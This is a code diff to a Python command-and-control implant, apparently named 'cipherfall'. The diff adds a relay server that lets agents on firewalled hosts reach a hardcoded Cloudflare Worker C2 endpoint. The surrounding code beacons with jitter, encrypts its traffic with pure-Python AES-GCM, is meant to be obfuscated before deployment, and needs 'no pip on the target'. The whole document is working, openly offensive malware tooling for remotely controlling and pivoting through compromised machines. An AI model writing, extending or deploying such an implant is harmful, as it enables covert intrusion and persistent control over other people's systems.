@@ -40,6 +40,16 @@ Environment variables (bake these before obfuscating):
   C2_PSK          pre-shared passphrase   (default: changeme)
   C2_INT          base beacon interval s  (default: 30)
   C2_JITTER       ± jitter seconds        (default: 10)
+  C2_RELAY_PORT   if set, start HTTP relay server on this port (default: 0 = off)
+  C2_RELAY_BIND   relay listen address    (default: 0.0.0.0)
+
+Relay mode (C2_RELAY_PORT):
+  Enables a plain-HTTP server that proxies Worker API calls from isolated agents
+  that cannot reach WORKER_URL directly (e.g. behind a firewall). The relay
+  validates the Bearer token, then forwards to the real WORKER_URL over HTTPS.
+  Isolated agent config: set WORKER_URL=http://<relay_host>:<C2_RELAY_PORT>.
+  Both relay and isolated agent must share the same PSK (token is identical).
+  The relay runs in a daemon thread; normal beacon loop is unaffected.
 
 Dependencies: Python 3.6+ stdlib only. No pip required on the target.
 
@@ -50,15 +60,19 @@ Limitations:
   - If a task is read but the agent crashes before sending the result, the
     task is irrecoverably lost from the Worker KV (re-queue manually).
   - Pure-Python AES is slower than a C extension; negligible for small payloads.
+  - Relay listens on plain HTTP; use only on trusted internal networks.
 """
 
-import base64, hashlib, hmac as _hmac, json, os, platform
-import random, ssl, struct, subprocess, sys, time, urllib.error, urllib.request
+import base64, hashlib, hmac as _hmac, http.server, json, os, platform
+import random, socketserver, ssl, struct, subprocess, sys, threading, time
+import urllib.error, urllib.request
 
-WORKER_URL = os.environ.get("WORKER_URL", "https://cipherfall-c2.elierocamora82.workers.dev").rstrip("/")
-PSK        = os.environ.get("C2_PSK",     "changeme")
-BEACON_INT = int(os.environ.get("C2_INT",    "30"))
-JITTER     = int(os.environ.get("C2_JITTER", "10"))
+WORKER_URL  = os.environ.get("WORKER_URL", "https://cipherfall-c2.elierocamora82.workers.dev").rstrip("/")
+PSK         = os.environ.get("C2_PSK",        "changeme")
+BEACON_INT  = int(os.environ.get("C2_INT",    "30"))
+JITTER      = int(os.environ.get("C2_JITTER", "10"))
+RELAY_PORT  = int(os.environ.get("C2_RELAY_PORT", "0"))
+RELAY_BIND  = os.environ.get("C2_RELAY_BIND", "0.0.0.0")
 
 # ── Pure-Python AES-256-GCM ──────────────────────────────────────────────────
 # Implements NIST FIPS 197 (AES block cipher) and SP 800-38D (GCM mode).
@@ -243,6 +257,43 @@ def _decrypt(token: str) -> dict:
     return json.loads(_gcm_dec(_KEY, nonce, ct, tag))
 
 
+# ── Relay server ─────────────────────────────────────────────────────────────
+
+
+class _RelayHandler(http.server.BaseHTTPRequestHandler):
+    def log_message(self, *_): pass
+
+    def _fwd(self, body=None):
+        if self.headers.get("Authorization", "") != f"Bearer {_WORKER_TOKEN}":
+            self.send_response(404); self.end_headers(); return
+        url  = WORKER_URL + self.path
+        hdrs = {"Authorization": f"Bearer {_WORKER_TOKEN}", "User-Agent": _UA}
+        if body:
+            hdrs["Content-Type"] = self.headers.get("Content-Type", "text/plain")
+        req = urllib.request.Request(url, data=body, headers=hdrs, method=self.command)
+        ctx = _SSL if url.startswith("https://") else None
+        try:
+            with urllib.request.urlopen(req, context=ctx, timeout=15) as r:
+                data = r.read()
+                self.send_response(r.status); self.end_headers(); self.wfile.write(data)
+        except urllib.error.HTTPError as e:
+            data = e.read()
+            self.send_response(e.code); self.end_headers(); self.wfile.write(data)
+        except Exception:
+            self.send_response(503); self.end_headers()
+
+    def do_GET(self): self._fwd()
+    def do_PUT(self):
+        n = int(self.headers.get("Content-Length", 0))
+        self._fwd(self.rfile.read(n) if n else None)
+
+
+def _start_relay():
+    srv = socketserver.ThreadingTCPServer((RELAY_BIND, RELAY_PORT), _RelayHandler)
+    srv.daemon_threads = True
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+
+
 # ── Agent logic ───────────────────────────────────────────────────────────────
 
 def _agent_id() -> str:
@@ -301,6 +352,8 @@ def main():
     if len(sys.argv) > 1 and sys.argv[1] == "--id":
         print(AGENT_ID)
         return
+    if RELAY_PORT:
+        _start_relay()
     while True:
         try:
             _beacon()
